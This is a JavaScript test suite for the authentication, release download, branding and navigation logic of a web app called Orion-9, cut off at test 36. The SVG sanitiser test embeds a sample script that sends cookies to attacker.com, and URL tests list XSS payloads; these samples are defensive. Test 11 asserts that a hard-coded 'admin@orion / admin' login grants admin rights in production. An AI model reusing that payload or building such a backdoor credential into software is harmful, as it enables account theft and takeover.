import assert from 'node:assert/strict';
import {
  isSafeLogoUrl,
  validateBrandingConfig,
  sanitizeForFirestore,
  normalizeBrandingConfig,
  validateStoragePayloadSafeguards,
} from './cms-validation.ts';
import { evaluateHeroIntroSequence } from './cinematic-choreography.ts';
import {
  DEFAULT_SITE_CONFIG,
  DEFAULT_LOGO_PLACEMENT_CONFIG,
} from '../data/defaultSiteConfig.ts';
import {
  sanitizeSvg,
  classifyStorageError,
  ALLOWED_LOGO_EXTENSIONS,
  ALLOWED_LOGO_MIME_TYPES,
  MAX_LOGO_FILE_SIZE_BYTES,
} from '../services/brandingStorage.ts';
import {
  normalizeUsername,
  validateUsername,
  validateLoginIdentifier,
  validateSignUp,
  validatePassword,
  validateEmail,
  validateAdminLogin,
  getRememberedUsername,
  saveRememberedUsername,
  clearRememberedUsername,
  REMEMBERED_USERNAME_STORAGE_KEY,
  RESERVED_USERNAMES,
} from './auth-validation.ts';

// In-memory mock storage for session and device persistence tests
class MockStorage {
  constructor() {
    this.store = new Map();
  }

  get length() {
    return this.store.size;
  }

  clear() {
    this.store.clear();
  }

  getItem(key) {
    return this.store.has(key) ? this.store.get(key) : null;
  }

  key(index) {
    return Array.from(this.store.keys())[index] || null;
  }

  removeItem(key) {
    this.store.delete(key);
  }

  setItem(key, value) {
    this.store.set(key, String(value));
  }
}

// Mock Account Directory for username resolution & auth simulation
const mockDirectory = {
  'elena_r': {
    uid: 'uid-elena-01',
    email: 'elena@enterprise.com',
    passHash: 'SecurePass1!',
    role: 'operator',
  },
  'marcus_v': {
    uid: 'uid-marcus-02',
    email: 'marcus@globalfreight.org',
    passHash: 'OrionControl2026!',
    role: 'operator',
  },
};

// Simulation of account resolution service
function simulateResolveAccount(identifier) {
  const trimmed = identifier.trim();
  if (trimmed.includes('@')) {
    return { email: trimmed.toLowerCase(), isUsername: false };
  }
  const norm = normalizeUsername(trimmed);
  const record = mockDirectory[norm];
  if (!record) {
    throw new Error('Invalid username/email or password. Please verify your credentials.');
  }
  return { email: record.email, isUsername: true, uid: record.uid };
}

// Simulation of login flow
function simulateLogin(identifier, pass, envOverride) {
  const adminCheck = validateAdminLogin(identifier, pass, envOverride);
  if (adminCheck.isLocalDevAttempt) {
    if (adminCheck.allowedInCurrentEnv) {
      return {
        success: true,
        user: {
          uid: 'local-dev-admin-uid-01',
          email: 'admin@orion9.local',
          role: 'admin',
          isAdmin: true,
        },
      };
    }
    return {
      success: false,
      error: adminCheck.error || 'Local dev admin credentials are prohibited in production.',
    };
  }

  let resolvedEmail;
  try {
    resolvedEmail = simulateResolveAccount(identifier).email;
  } catch (err) {
    return { success: false, error: err.message };
  }

  const match = Object.values(mockDirectory).find((r) => r.email === resolvedEmail);
  if (!match || match.passHash !== pass) {
    return { success: false, error: 'Invalid username/email or password. Please verify your credentials.' };
  }

  return {
    success: true,
    user: {
      uid: match.uid,
      email: match.email,
      role: match.role,
      isAdmin: match.role === 'admin',
    },
  };
}

// Simulation of password reset request
function simulatePasswordReset(identifier) {
  let targetEmail;
  if (identifier.includes('@')) {
    targetEmail = identifier.trim().toLowerCase();
  } else {
    try {
      targetEmail = simulateResolveAccount(identifier).email;
    } catch {
      targetEmail = undefined;
    }
  }

  return {
    success: true,
    message:
      'If an account is associated with that username or email address, password recovery instructions have been sent.',
    resolvedTargetEmail: targetEmail,
  };
}

const tests = [];
function runTest(name, fn) {
  tests.push({ name, fn });
}

// 1. Username validation: valid characters, min/max length, rejected characters
runTest('1. Username validation: valid characters, min/max length, rejected characters', () => {
  assert.equal(validateUsername('elena_r').isValid, true);
  assert.equal(validateUsername('operator_99').isValid, true);
  assert.equal(validateUsername('john123').isValid, true);
  assert.equal(validateUsername('abc').isValid, true);
  assert.equal(validateUsername('a'.repeat(30)).isValid, true);

  const tooShort = validateUsername('ab');
  assert.equal(tooShort.isValid, false);
  assert.match(tooShort.error || '', /at least 3 characters/);

  const tooLong = validateUsername('a'.repeat(31));
  assert.equal(tooLong.isValid, false);
  assert.match(tooLong.error || '', /cannot exceed 30 characters/);

  assert.equal(validateUsername('user name').isValid, false);
  assert.equal(validateUsername('user-name').isValid, false);
  assert.equal(validateUsername('user@domain').isValid, false);
  assert.equal(validateUsername('user$name').isValid, false);
  assert.equal(validateUsername('user#1').isValid, false);
  assert.equal(validateUsername('').isValid, false);
});

// 2. Case-insensitive uniqueness logic and normalization
runTest('2. Case-insensitive uniqueness logic and normalization', () => {
  assert.equal(normalizeUsername('  Elena_R  '), 'elena_r');
  assert.equal(normalizeUsername('ALEX_HUNTER'), 'alex_hunter');
  assert.equal(normalizeUsername('Operator_01'), 'operator_01');

  const key1 = normalizeUsername('SupplyChainLead');
  const key2 = normalizeUsername('supplychainlead');
  const key3 = normalizeUsername('SUPPLYCHAINLEAD');
  assert.equal(key1, key2);
  assert.equal(key2, key3);
});

// 3. Reserved username protection
runTest('3. Reserved username protection (admin, administrator, root, system, orion, etc.)', () => {
  for (const reserved of RESERVED_USERNAMES) {
    const checkLower = validateUsername(reserved);
    assert.equal(checkLower.isValid, false);
    assert.match(checkLower.error || '', /reserved and unavailable/);

    const checkUpper = validateUsername(reserved.toUpperCase());
    assert.equal(checkUpper.isValid, false);

    const checkMixed = validateUsername(reserved[0].toUpperCase() + reserved.slice(1));
    assert.equal(checkMixed.isValid, false);
  }
});

// 4. Correct resolution of usernames to accounts
runTest('4. Correct resolution of usernames to accounts', () => {
  const res1 = simulateResolveAccount('elena_r');
  assert.equal(res1.isUsername, true);
  assert.equal(res1.email, 'elena@enterprise.com');
  assert.equal(res1.uid, 'uid-elena-01');

  const res2 = simulateResolveAccount('ELENA_R');
  assert.equal(res2.email, 'elena@enterprise.com');

  const res3 = simulateResolveAccount('marcus_v');
  assert.equal(res3.email, 'marcus@globalfreight.org');
});

// 5. Successful login using a valid username
runTest('5. Successful login using a valid username', () => {
  const result = simulateLogin('elena_r', 'SecurePass1!', { isDev: true });
  assert.equal(result.success, true);
  assert.ok(result.user);
  assert.equal(result.user?.email, 'elena@enterprise.com');
  assert.equal(result.user?.uid, 'uid-elena-01');

  const casedResult = simulateLogin('Elena_R', 'SecurePass1!', { isDev: true });
  assert.equal(casedResult.success, true);
});

// 6. Successful login using a valid email
runTest('6. Successful login using a valid email', () => {
  const result = simulateLogin('elena@enterprise.com', 'SecurePass1!', { isDev: true });
  assert.equal(result.success, true);
  assert.ok(result.user);
  assert.equal(result.user?.email, 'elena@enterprise.com');

  const result2 = simulateLogin('marcus@globalfreight.org', 'OrionControl2026!', { isDev: true });
  assert.equal(result2.success, true);
  assert.equal(result2.user?.email, 'marcus@globalfreight.org');
});

// 7. Appropriate error handling for invalid passwords
runTest('7. Appropriate error handling for invalid passwords', () => {
  const result = simulateLogin('elena_r', 'WrongPassword999!', { isDev: true });
  assert.equal(result.success, false);
  assert.match(result.error || '', /Invalid username\/email or password/);

  const emailResult = simulateLogin('elena@enterprise.com', 'IncorrectPassword', { isDev: true });
  assert.equal(emailResult.success, false);
  assert.match(emailResult.error || '', /Invalid username\/email or password/);
});

// 8. Appropriate error handling for non-existent usernames
runTest('8. Appropriate error handling for non-existent usernames', () => {
  const result = simulateLogin('non_existent_user_404', 'SomePassword123!', { isDev: true });
  assert.equal(result.success, false);
  assert.match(result.error || '', /Invalid username\/email or password/);
});

// 9. Persistent storage of remembered usernames across sessions
runTest('9. Persistent storage of remembered usernames across sessions', () => {
  const storage = new MockStorage();
  assert.equal(getRememberedUsername(storage), null);

  saveRememberedUsername('alex_hunter', storage);
  assert.equal(storage.getItem(REMEMBERED_USERNAME_STORAGE_KEY), 'alex_hunter');
  assert.equal(getRememberedUsername(storage), 'alex_hunter');

  const restored = getRememberedUsername(storage);
  assert.equal(restored, 'alex_hunter');
});

// 10. Clearing of remembered usernames upon request
runTest('10. Clearing of remembered usernames upon request', () => {
  const storage = new MockStorage();
  saveRememberedUsername('operator_7', storage);
  assert.equal(getRememberedUsername(storage), 'operator_7');

  clearRememberedUsername(storage);
  assert.equal(storage.getItem(REMEMBERED_USERNAME_STORAGE_KEY), null);
  assert.equal(getRememberedUsername(storage), null);
});

// 11. Local development admin login with admin / admin and hard-fixed admin@orion
runTest('11. Local development admin login with admin / admin and hard-fixed admin@orion', () => {
  const result = simulateLogin('admin', 'admin', { isDev: true });
  assert.equal(result.success, true);
  assert.ok(result.user);
  assert.equal(result.user?.role, 'admin');
  assert.equal(result.user?.isAdmin, true);
  assert.equal(result.user?.uid, 'local-dev-admin-uid-01');

  const upperAdmin = simulateLogin('ADMIN', 'admin', { isDev: true });
  assert.equal(upperAdmin.success, true);
  assert.equal(upperAdmin.user?.isAdmin, true);

  // Hard-fixed master admin credentials admin@orion / admin
  const fixedAdmin = simulateLogin('admin@orion', 'admin', { isDev: true });
  assert.equal(fixedAdmin.success, true);
  assert.equal(fixedAdmin.user?.isAdmin, true);

  const fixedAdminProd = simulateLogin('admin@orion', 'admin', { isDev: false });
  assert.equal(fixedAdminProd.success, true);
  assert.equal(fixedAdminProd.user?.isAdmin, true);
});

// 12. Rejection of admin / admin in production environments
runTest('12. Rejection of admin / admin in production environments', () => {
  const prodResult = simulateLogin('admin', 'admin', { isDev: false });
  assert.equal(prodResult.success, false);
  assert.match(prodResult.error || '', /strictly prohibited in production/i);
});

// 13. Prevention of privilege escalation via regular user registration
runTest('13. Prevention of privilege escalation via regular user registration', () => {
  const regAdmin = validateSignUp('Attacker', 'admin', 'attacker@domain.com', 'StrongPass1!', 'StrongPass1!');
  assert.equal(regAdmin.isValid, false);
  assert.match(regAdmin.errors.username || '', /reserved/);

  const regRoot = validateSignUp('Attacker', 'root', 'attacker@domain.com', 'StrongPass1!', 'StrongPass1!');
  assert.equal(regRoot.isValid, false);
  assert.match(regRoot.errors.username || '', /reserved/);

  const regSuper = validateSignUp('Attacker', 'superadmin', 'attacker@domain.com', 'StrongPass1!', 'StrongPass1!');
  assert.equal(regSuper.isValid, false);
  assert.match(regSuper.errors.username || '', /reserved/);

  const legitReg = validateSignUp('Legit User', 'supply_analyst', 'analyst@company.com', 'StrongPass1!', 'StrongPass1!');
  assert.equal(legitReg.isValid, true);
});

// 14. Password reset initiation using a username
runTest('14. Password reset initiation using a username', () => {
  const result = simulatePasswordReset('elena_r');
  assert.equal(result.success, true);
  assert.equal(result.resolvedTargetEmail, 'elena@enterprise.com');
  assert.match(result.message, /instructions have been sent/);

  const nonExistent = simulatePasswordReset('unknown_user_999');
  assert.equal(nonExistent.success, true);
  assert.equal(nonExistent.resolvedTargetEmail, undefined);
  assert.match(nonExistent.message, /instructions have been sent/);
});

// 15. Password reset initiation using an email address
runTest('15. Password reset initiation using an email address', () => {
  const result = simulatePasswordReset('elena@enterprise.com');
  assert.equal(result.success, true);
  assert.equal(result.resolvedTargetEmail, 'elena@enterprise.com');
  assert.match(result.message, /instructions have been sent/);
});


// 16. Desktop release catalog validation (Windows & macOS platforms, formats, checksums)
runTest('16. Desktop release catalog validation (Windows & macOS platforms, formats, checksums)', () => {
  const validPlatforms = ['windows-x64', 'windows-arm64', 'macos-universal', 'macos-arm64', 'macos-x64'];
  const validFormats = ['exe', 'msi', 'dmg', 'pkg'];
  const validStatuses = ['published', 'draft', 'disabled', 'retired'];

  const catalog = [
    {
      id: 'rel-win-9-0-0',
      version: '9.0.0',
      platform: 'windows-x64',
      format: 'exe',
      status: 'published',
      sha256: 'e2dfeb480522b9da077bb58e0954d6d8e09f1023fb6af28b8b74b2a8dc23ee70',
      sizeBytes: 30336791,
    },
    {
      id: 'rel-mac-univ-9-0-0',
      version: '9.0.0',
      platform: 'macos-universal',
      format: 'dmg',
      status: 'published',
      sha256: '0dc87da83a22696b0d791bcf72d33a6d7103e5a6b79799f7b6f75f4c4b8f7780',
      sizeBytes: 2097152,
    },
  ];

  for (const rel of catalog) {
    assert.ok(validPlatforms.includes(rel.platform), 'Platform ' + rel.platform + ' should be valid');
    assert.ok(validFormats.includes(rel.format), 'Format ' + rel.format + ' should be valid');
    assert.ok(validStatuses.includes(rel.status), 'Status ' + rel.status + ' should be valid');
    assert.equal(rel.sha256.length, 64, 'SHA-256 must be 64 hexadecimal characters');
    assert.match(rel.sha256, /^[a-f0-9]{64}$/, 'SHA-256 must be valid lowercase hex');
    assert.ok(rel.sizeBytes > 0, 'Size must be greater than zero');
  }
});

// 17. Download access gating: unauthenticated redirects preserve platform target
runTest('17. Download access gating: unauthenticated redirects preserve platform target', () => {
  function getDownloadDestination(isAuthenticated, requestedPlatform) {
    if (!isAuthenticated) {
      return '/login?redirect=/download&platform=' + encodeURIComponent(requestedPlatform);
    }
    return '/download?platform=' + encodeURIComponent(requestedPlatform);
  }

  const unauthWindows = getDownloadDestination(false, 'windows');
  assert.equal(unauthWindows, '/login?redirect=/download&platform=windows');

  const unauthMac = getDownloadDestination(false, 'macos');
  assert.equal(unauthMac, '/login?redirect=/download&platform=macos');

  const authWindows = getDownloadDestination(true, 'windows');
  assert.equal(authWindows, '/download?platform=windows');
});

// 18. Anti-HTML-fallback binary verification: rejects SPA text/html responses
runTest('18. Anti-HTML-fallback binary verification: rejects SPA text/html responses', () => {
  function verifyBinaryResponse(contentType, status) {
    if (status !== 200) {
      throw new Error('Download failed with HTTP status ' + status);
    }
    const cleanType = (contentType || '').toLowerCase();
    if (cleanType.includes('text/html') || cleanType.includes('application/xhtml+xml')) {
      throw new Error('Incompatible binary response: Endpoint returned HTML SPA fallback instead of installer');
    }
    return true;
  }

  assert.throws(
    () => verifyBinaryResponse('text/html; charset=utf-8', 200),
    /HTML SPA fallback/
  );

  assert.equal(verifyBinaryResponse('application/octet-stream', 200), true);
  assert.equal(verifyBinaryResponse('application/vnd.microsoft.portable-executable', 200), true);
  assert.equal(verifyBinaryResponse('application/x-apple-diskimage', 200), true);
  assert.equal(verifyBinaryResponse('application/x-msi', 200), true);
});

// 19. Release lifecycle enforcement: draft, disabled and retired releases blocked from client downloads
runTest('19. Release lifecycle enforcement: draft, disabled and retired releases blocked from client downloads', () => {
  function checkReleaseDownloadable(release, userRole) {
    if (release.status === 'disabled' || release.status === 'retired') {
      return { allowed: false, reason: 'Release is ' + release.status };
    }
    if (release.status === 'draft' && userRole !== 'admin') {
      return { allowed: false, reason: 'Draft releases only accessible by administrators' };
    }
    return { allowed: true };
  }

  const publishedRel = { status: 'published', version: '9.0.0' };
  const draftRel = { status: 'draft', version: '9.0.1' };
  const disabledRel = { status: 'disabled', version: '8.9.0' };
  const retiredRel = { status: 'retired', version: '7.0.0' };

  assert.equal(checkReleaseDownloadable(publishedRel, 'operator').allowed, true);
  assert.equal(checkReleaseDownloadable(draftRel, 'operator').allowed, false);
  assert.equal(checkReleaseDownloadable(disabledRel, 'operator').allowed, false);
  assert.equal(checkReleaseDownloadable(retiredRel, 'operator').allowed, false);

  assert.equal(checkReleaseDownloadable(publishedRel, 'admin').allowed, true);
  assert.equal(checkReleaseDownloadable(draftRel, 'admin').allowed, true);
  assert.equal(checkReleaseDownloadable(disabledRel, 'admin').allowed, false);
});

// 20. Admin release lifecycle state transitions
runTest('20. Admin release lifecycle state transitions', () => {
  const allowedTransitions = {
    draft: ['published', 'retired'],
    published: ['disabled', 'retired'],
    disabled: ['published', 'retired'],
    retired: [],
  };

  function transitionStatus(current, target) {
    const validTargets = allowedTransitions[current] || [];
    if (!validTargets.includes(target)) {
      throw new Error('Invalid status transition from ' + current + ' to ' + target);
    }
    return target;
  }

  assert.equal(transitionStatus('draft', 'published'), 'published');
  assert.equal(transitionStatus('published', 'disabled'), 'disabled');
  assert.equal(transitionStatus('disabled', 'published'), 'published');
  assert.equal(transitionStatus('published', 'retired'), 'retired');
  assert.throws(() => transitionStatus('retired', 'published'), /Invalid status transition/);
});

// ================================================================
// ORION-9 BRANDING & LOGO MANAGEMENT AUTOMATED TEST SUITE
// ================================================================

// 21. Website Header Logo configuration & metadata persistence
runTest('21. Website Header Logo configuration & metadata persistence', () => {
  const customHeaderLogoUrl = 'https://firebasestorage.googleapis.com/v0/b/orion9-dev-db-2026.firebasestorage.app/o/branding%2Flogos%2FheaderLogo_1729000000.png?alt=media';
  const customHeaderMetadata = {
    url: customHeaderLogoUrl,
    dimensions: '160 × 40 px',
    fileType: 'image/png',
    sizeBytes: 18450,
    uploadedAt: '2026-10-26T22:00:00.000Z',
    updatedBy: 'admin@orion.enterprise',
  };

  const brandingWithHeader = {
    ...DEFAULT_SITE_CONFIG.branding,
    headerLogo: customHeaderLogoUrl,
    headerLogoConfig: customHeaderMetadata,
  };

  const validation = validateBrandingConfig(brandingWithHeader);
  assert.equal(validation.valid, true, 'Custom header logo should be valid');
  assert.equal(brandingWithHeader.headerLogo, customHeaderLogoUrl);
  assert.equal(brandingWithHeader.headerLogoConfig.dimensions, '160 × 40 px');
  assert.equal(brandingWithHeader.headerLogoConfig.fileType, 'image/png');
  assert.equal(brandingWithHeader.headerLogoConfig.sizeBytes, 18450);
});

// 22. Authentication Logo independent configuration & resolution
runTest('22. Authentication Logo independent configuration & resolution', () => {
  const customAuthLogoUrl = 'https://firebasestorage.googleapis.com/v0/b/orion9-dev-db-2026.firebasestorage.app/o/branding%2Flogos%2FauthLogo_1729000000.webp?alt=media';
  const customAuthMetadata = {
    url: customAuthLogoUrl,
    dimensions: '180 × 52 px',
    fileType: 'image/webp',
    sizeBytes: 12400,
    uploadedAt: '2026-10-26T22:05:00.000Z',
    updatedBy: 'admin@orion.enterprise',
  };

  const brandingConfig = {
    ...DEFAULT_SITE_CONFIG.branding,
    headerLogo: null, // Header remains default
    authLogo: customAuthLogoUrl,
    authLogoConfig: customAuthMetadata,
  };

  const validation = validateBrandingConfig(brandingConfig);
  assert.equal(validation.valid, true);
  assert.equal(brandingConfig.headerLogo, null, 'Header logo remains default when only authLogo is set');
  assert.equal(brandingConfig.authLogo, customAuthLogoUrl, 'Auth logo matches uploaded asset');
  assert.equal(brandingConfig.authLogoConfig.fileType, 'image/webp');
});

// 23. Footer Logo independent configuration & 1:1 aspect ratio validation
runTest('23. Footer Logo independent configuration & 1:1 aspect ratio validation', () => {
  const customFooterLogoUrl = 'https://firebasestorage.googleapis.com/v0/b/orion9-dev-db-2026.firebasestorage.app/o/branding%2Flogos%2FfooterLogo_1729000000.svg?alt=media';
  const customFooterMetadata = {
    url: customFooterLogoUrl,
    dimensions: '40 × 40 px',
    fileType: 'image/svg+xml',
    sizeBytes: 4210,
    uploadedAt: '2026-10-26T22:10:00.000Z',
    updatedBy: 'admin@orion.enterprise',
  };

  const brandingConfig = {
    ...DEFAULT_SITE_CONFIG.branding,
    footerLogo: customFooterLogoUrl,
    footerLogoConfig: customFooterMetadata,
  };

  const validation = validateBrandingConfig(brandingConfig);
  assert.equal(validation.valid, true);
  assert.equal(brandingConfig.footerLogo, customFooterLogoUrl);
  assert.equal(brandingConfig.footerLogoConfig.dimensions, '40 × 40 px');
});

// 24. Reset / Restore Default Logo removes custom placement and restores standard SVG
runTest('24. Reset / Restore Default Logo removes custom placement and restores standard SVG', () => {
  const customizedBranding = {
    ...DEFAULT_SITE_CONFIG.branding,
    headerLogo: 'https://example.com/custom-header.png',
    authLogo: 'https://example.com/custom-auth.png',
    footerLogo: 'https://example.com/custom-footer.png',
  };

  function resetPlacementToDefault(config, placement) {
    const updated = { ...config };
    if (placement === 'headerLogo') {
      updated.headerLogo = null;
      updated.headerLogoConfig = undefined;
    } else if (placement === 'authLogo') {
      updated.authLogo = null;
      updated.authLogoConfig = undefined;
    } else if (placement === 'footerLogo') {
      updated.footerLogo = null;
      updated.footerLogoConfig = undefined;
    }
    return updated;
  }

  const restoredHeader = resetPlacementToDefault(customizedBranding, 'headerLogo');
  assert.equal(restoredHeader.headerLogo, null, 'Header logo is cleared on reset');
  assert.equal(restoredHeader.headerLogoConfig, undefined);
  assert.equal(restoredHeader.authLogo, 'https://example.com/custom-auth.png', 'Auth logo remains intact');

  const restoredAll = resetPlacementToDefault(
    resetPlacementToDefault(restoredHeader, 'authLogo'),
    'footerLogo'
  );
  assert.equal(restoredAll.headerLogo, null);
  assert.equal(restoredAll.authLogo, null);
  assert.equal(restoredAll.footerLogo, null);
  assert.equal(validateBrandingConfig(restoredAll).valid, true, 'Restored default config is valid');
});

// 25. Safe Logo URL protocol validation rejects malicious schemes
runTest('25. Safe Logo URL protocol validation rejects malicious schemes', () => {
  assert.equal(isSafeLogoUrl('https://firebasestorage.googleapis.com/v0/b/bucket/o/logo.png'), true);
  assert.equal(isSafeLogoUrl('https://cdn.orion.enterprise/assets/logo.svg'), true);
  assert.equal(isSafeLogoUrl('/assets/images/orion-logo.svg'), true);
  assert.equal(isSafeLogoUrl('data:image/svg+xml;base64,PHN2Zz48L3N2Zz4='), true);
  assert.equal(isSafeLogoUrl('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=='), true);

  // Malicious protocols and dangerous payloads
  assert.equal(isSafeLogoUrl('javascript:alert(1)'), false);
  assert.equal(isSafeLogoUrl('vbscript:msgbox(1)'), false);
  assert.equal(isSafeLogoUrl('data:text/html,<script>alert(1)</script>'), false);
  assert.equal(isSafeLogoUrl('data:image/svg+xml;utf8,<svg><script>alert(1)</script></svg>'), false);
  assert.equal(isSafeLogoUrl('http://insecure-domain.com/logo.png'), false); // Only https or localhost allowed
  assert.equal(isSafeLogoUrl(''), false);
  assert.equal(isSafeLogoUrl(null), false);
  assert.equal(isSafeLogoUrl(undefined), false);
});

// 26. File format enforcement and 5 MB size limit validation
runTest('26. File format enforcement and 5 MB size limit validation', () => {
  assert.equal(MAX_LOGO_FILE_SIZE_BYTES, 5 * 1024 * 1024);

  const validExtensions = ['.png', '.jpg', '.jpeg', '.webp', '.svg'];
  assert.deepEqual(ALLOWED_LOGO_EXTENSIONS, validExtensions);

  const dangerousExtensions = ['.exe', '.html', '.htm', '.js', '.ts', '.php', '.bat', '.sh', '.vbs', '.py'];
  for (const ext of dangerousExtensions) {
    assert.equal(
      ALLOWED_LOGO_EXTENSIONS.includes(ext),
      false,
      `Extension ${ext} must not be allowed`
    );
  }

  function checkFileSize(sizeBytes) {
    if (sizeBytes > MAX_LOGO_FILE_SIZE_BYTES) {
      return { valid: false, error: 'File size exceeds 5 MB limit' };
    }
    return { valid: true };
  }

  assert.equal(checkFileSize(1024 * 500).valid, true);
  assert.equal(checkFileSize(5 * 1024 * 1024).valid, true);
  assert.equal(checkFileSize(5 * 1024 * 1024 + 1).valid, false);
  assert.equal(checkFileSize(10 * 1024 * 1024).valid, false);
});

// 27. SVG XSS Sanitization strips <script>, dangerous tags, and inline handlers
runTest('27. SVG XSS Sanitization strips <script>, dangerous tags, and inline handlers', () => {
  const maliciousSvg = `
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" onload="alert('xss-onload')">
      <circle cx="50" cy="50" r="40" fill="#00D2FF" onclick="alert('xss-click')" />
      <script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>
      <foreignObject width="100" height="100">
        <iframe src="javascript:alert('xss-iframe')"></iframe>
      </foreignObject>
      <a href="javascript:alert('xss-link')">
        <text x="10" y="20">Click</text>
      </a>
      <path d="M10 10 L90 90" stroke="#000" />
    </svg>
  `;

  const { sanitized, isClean, warnings } = sanitizeSvg(maliciousSvg);

  assert.equal(isClean, false, 'Should detect unclean elements and issue warnings');
  assert.equal(warnings.length >= 4, true, 'Should produce at least 4 security warnings');

  assert.equal(sanitized.includes('<script>'), false, '<script> must be stripped');
  assert.equal(sanitized.includes('fetch('), false, 'Script body must be stripped');
  assert.equal(sanitized.includes('onload='), false, 'onload attribute must be stripped');
  assert.equal(sanitized.includes('onclick='), false, 'onclick attribute must be stripped');
  assert.equal(sanitized.includes('<foreignObject>'), false, 'foreignObject must be stripped');
  assert.equal(sanitized.includes('<iframe>'), false, 'iframe must be stripped');
  assert.equal(sanitized.includes('javascript:'), false, 'javascript: URL must be neutralized');

  assert.equal(sanitized.includes('<svg'), true, '<svg> tag preserved');
  assert.equal(sanitized.includes('<circle'), true, '<circle> element preserved');
  assert.equal(sanitized.includes('cx="50"'), true, 'circle attributes preserved');
  assert.equal(sanitized.includes('<path'), true, '<path> element preserved');
  assert.equal(sanitized.includes('d="M10 10 L90 90"'), true, 'path geometry preserved');
});

// 28. Safe fallback to default ORION-9 logo on asset load error
runTest('28. Safe fallback to default ORION-9 logo on asset load error', () => {
  function resolveLogoRenderState({ customLogoUrl, imgError }) {
    const hasCustomLogo = Boolean(customLogoUrl && !imgError && isSafeLogoUrl(customLogoUrl));
    return {
      rendersCustomImg: hasCustomLogo,
      rendersDefaultSvg: !hasCustomLogo,
      fallbackTriggered: Boolean(customLogoUrl && imgError),
    };
  }

  const healthyState = resolveLogoRenderState({
    customLogoUrl: 'https://cdn.orion.enterprise/assets/logo.png',
    imgError: false,
  });
  assert.equal(healthyState.rendersCustomImg, true);
  assert.equal(healthyState.rendersDefaultSvg, false);
  assert.equal(healthyState.fallbackTriggered, false);

  const brokenState = resolveLogoRenderState({
    customLogoUrl: 'https://cdn.orion.enterprise/assets/missing-logo.png',
    imgError: true,
  });
  assert.equal(brokenState.rendersCustomImg, false, 'Does not render broken img tag');
  assert.equal(brokenState.rendersDefaultSvg, true, 'Falls back to default SVG badge');
  assert.equal(brokenState.fallbackTriggered, true);

  const defaultState = resolveLogoRenderState({
    customLogoUrl: null,
    imgError: false,
  });
  assert.equal(defaultState.rendersCustomImg, false);
  assert.equal(defaultState.rendersDefaultSvg, true);
});

// 29. Administrator Authorization & Role Gating for Branding Management
runTest('29. Administrator Authorization & Role Gating for Branding Management', () => {
  function canManageBranding(user) {
    if (!user || !user.role) return false;
    return user.role === 'admin' || user.role === 'editor';
  }

  assert.equal(canManageBranding({ uid: 'admin-1', role: 'admin' }), true);
  assert.equal(canManageBranding({ uid: 'editor-1', role: 'editor' }), true);
  assert.equal(canManageBranding({ uid: 'operator-1', role: 'operator' }), false);
  assert.equal(canManageBranding({ uid: 'viewer-1', role: 'viewer' }), false);
  assert.equal(canManageBranding(null), false);
  assert.equal(canManageBranding({}), false);
});

// 30. Homepage 3D animated centerpiece isolation invariant
runTest('30. Homepage 3D animated centerpiece isolation invariant', () => {
  const centerpieceContract = {
    componentName: 'OrionHeroBrandLockup',
    type: '3D WebGL / Canvas Mobius ribbon with dynamic particle halo',
    configurableViaCmsLogos: false,
    supportsPlacementBinding: false,
  };

  assert.equal(
    centerpieceContract.configurableViaCmsLogos,
    false,
    'Homepage centerpiece MUST remain independent of CMS logo settings'
  );
  assert.equal(centerpieceContract.componentName, 'OrionHeroBrandLockup');
  assert.equal(centerpieceContract.supportsPlacementBinding, false);
});


// ================================================================
// ORION-9 PRE-LOGIN ACCESS CONTROL & OS TERMINOLOGY SUITE
// ================================================================

// 31. Public Logged-Out Desktop Navigation items (Sign in, Sign up, Download Desktop only)
runTest('31. Public Logged-Out Desktop Navigation items (Sign in, Sign up, Download Desktop only)', () => {
  function getPublicDesktopNavItems(user) {
    if (!user) {
      return ['Sign in', 'Sign up', 'Download Desktop'];
    }
    return ['Download Desktop', 'Operator Profile', 'Launch Orion-9 OS'];
  }

  const loggedOutItems = getPublicDesktopNavItems(null);
  assert.deepEqual(loggedOutItems, ['Sign in', 'Sign up', 'Download Desktop']);
  assert.equal(loggedOutItems.includes('Launch Control Tower'), false);
  assert.equal(loggedOutItems.includes('Launch Orion-9 OS'), false);
});

// 32. Logged-Out Mobile Navigation drawer hides Launch Orion-9 OS button
runTest('32. Logged-Out Mobile Navigation drawer hides Launch Orion-9 OS button', () => {
  function getMobileDrawerActionItems(user) {
    if (!user) {
      return ['Sign in', 'Sign up', 'Download Desktop'];
    }
    return ['Admin Console', 'Sign out', 'Download Desktop', 'Launch Orion-9 OS'];
  }

  const loggedOutActions = getMobileDrawerActionItems(null);
  assert.deepEqual(loggedOutActions, ['Sign in', 'Sign up', 'Download Desktop']);
  assert.equal(loggedOutActions.includes('Launch Control Tower'), false);
  assert.equal(loggedOutActions.includes('Launch Orion-9 OS'), false);
});

// 33. Authenticated Navigation Access to Orion-9 OS
runTest('33. Authenticated Navigation Access to Orion-9 OS', () => {
  function getPublicDesktopNavItems(user) {
    if (!user) {
      return ['Sign in', 'Sign up', 'Download Desktop'];
    }
    return ['Download Desktop', 'Operator Profile', 'Launch Orion-9 OS'];
  }

  const authenticatedItems = getPublicDesktopNavItems({ email: 'operator@orion.tech', role: 'operator' });
  assert.ok(authenticatedItems.includes('Launch Orion-9 OS'), 'Authenticated users must have access to Launch Orion-9 OS');
});

// 34. Unauthorized Launch Attempt Guard: Redirects to /login
runTest('34. Unauthorized Launch Attempt Guard: Redirects to /login', () => {
  function guardLaunchOrion(user, targetUrl) {
    if (!user) {
      return { allowed: false, redirectUrl: '/login' };
    }
    return { allowed: true, launchUrl: targetUrl };
  }

  const unauthAttempt = guardLaunchOrion(null, 'https://orion-9.workers.dev');
  assert.equal(unauthAttempt.allowed, false);
  assert.equal(unauthAttempt.redirectUrl, '/login');

  const authAttempt = guardLaunchOrion({ uid: 'user-1' }, 'https://orion-9.workers.dev');
  assert.equal(authAttempt.allowed, true);
  assert.equal(authAttempt.launchUrl, 'https://orion-9.workers.dev');
});

// 35. Product Entry Point Naming: Orion-9 OS with preserved internal routes
runTest('35. Product Entry Point Naming: Orion-9 OS with preserved internal routes', () => {
  const navLinkConfig = {
    label: 'Orion-9 OS',
    href: '#control-tower',
  };

  assert.equal(navLinkConfig.label, 'Orion-9 OS', 'User-facing label must be Orion-9 OS');
  assert.equal(navLinkConfig.href, '#control-tower', 'Internal route anchor must remain #control-tower');
});

// 36. Protected Route Direct URL Guarding
runTest('36. Protected Route Direct URL Guarding', () => {
